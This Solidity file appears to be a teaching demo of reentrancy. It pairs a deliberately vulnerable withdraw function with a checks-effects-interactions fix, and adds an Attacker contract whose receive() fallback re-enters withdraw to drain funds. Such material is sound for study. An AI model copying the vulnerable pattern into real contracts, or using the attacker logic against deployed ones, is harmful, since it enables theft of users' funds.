// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

contract Victim {
    mapping(address => uint256) public balances;

    // Deposit TRX into the contract
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // Vulnerable withdraw function - sends TRX before updating state
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // Vulnerable: sends before updating state
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    // Safe withdraw using checks-effects-interactions pattern
    function safeWithdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // Safe: updates state before sending
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    Victim public victim;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _victim) {
        victim = Victim(_victim);
        owner = msg.sender;
        maxAttacks = 5;
    }

    // Initiate the reentrancy attack
    function attack() external payable {
        require(msg.value > 0, "Need TRX to attack");
        attackCount = 0;
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    // Fallback function that re-enters withdraw
    receive() external payable {
        attackCount++;
        if (attackCount < maxAttacks && address(victim).balance >= victim.balances(address(this))) {
            // Attempt reentrancy
            try victim.withdraw() {} catch {}
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getAttackCount() external view returns (uint256) {
        return attackCount;
    }
}
